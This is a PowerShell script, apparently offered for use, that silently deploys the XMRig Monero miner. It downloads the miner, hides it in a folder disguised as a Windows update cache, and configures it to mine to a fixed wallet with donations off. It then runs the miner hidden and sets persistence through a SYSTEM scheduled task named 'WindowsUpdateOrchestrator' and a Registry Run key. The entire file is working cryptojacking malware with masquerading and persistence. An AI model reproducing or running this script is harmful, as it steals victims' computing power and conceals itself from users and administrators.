# Silent XMRig Deploy v6 - Fixed Persistence + Immediate Start
$InstallDir = "C:\ProgramData\WindowsUpdateCache"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
}

$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\wucache.zip"

Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing
Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue

$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
}

$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" | Select-Object -First 1).FullName
$ConfigPath = "$InstallDir\config.json"

$ConfigJson = @"
{
  "autosave": false,
  "colors": false,
  "cpu": { "enabled": true, "max-threads-hint": 60 },
  "donate-level": 0,
  "pools": [{
    "algo": "rx/0",
    "url": "pool.supportxmr.com:443",
    "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
    "pass": "x",
    "keepalive": true,
    "tls": true,
    "rig-id": "$env:COMPUTERNAME"
  }],
  "print-time": 60
}
"@
$ConfigJson | Out-File $ConfigPath -Encoding UTF8 -Force

# Immediate start (hidden)
Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden

# Persistence as SYSTEM (more reliable)
$TaskName = "WindowsUpdateOrchestrator"
$Action  = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
$Trigger = New-ScheduledTaskTrigger -AtStartup

try {
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
} catch {
    # Fallback to current user AtLogOn
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force | Out-Null
}

# Extra: Registry fallback (very reliable)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$ExePath`" -c `"$ConfigPath`" -B --no-color" -Force
